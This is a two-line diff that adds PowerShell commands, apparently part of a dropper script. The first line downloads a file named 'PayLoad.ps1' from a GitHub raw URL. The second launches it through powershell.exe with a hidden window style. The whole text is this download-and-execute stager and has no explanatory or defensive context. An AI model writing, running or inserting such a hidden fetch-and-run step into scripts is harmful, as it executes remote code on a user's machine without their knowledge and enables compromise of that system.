@@ -1,0 +1,2 @@
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Felix-ote/PenDev/main/PayLoad.ps1" -OutFile $scriptPath
+Start-Process -FilePath powershell.exe -ArgumentList "-file $scriptPath -WindowStyle hidden"
